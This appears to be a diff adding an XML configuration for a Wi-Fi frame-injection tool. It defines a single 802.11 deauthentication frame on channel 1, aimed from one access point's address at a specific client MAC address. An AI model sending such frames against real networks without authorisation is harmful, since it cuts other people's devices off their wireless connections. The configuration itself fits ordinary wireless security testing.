@@ -1,0 +1,20 @@
+<?xml version="1.0" ?>                                                
+
+<list>
+	<!-- STA block -->
+	<airconf>
+		<key>1</key>
+		<seq>2</seq>
+       	<type>0</type>
+		<desc>de-auth</desc>
+		<channel>1</channel>
+		<dwell>10</dwell>
+		<subtype>12</subtype>
+		<ds tods="0" fromds="1" />
+		<addr count="3">
+			<da>58:40:4e:71:7e:0c</da>
+			<sa>9c:1c:12:97:10:80</sa>
+			<bssid>9c:1c:12:97:10:80</bssid>
+		</addr>
+	</airconf>
+</list>
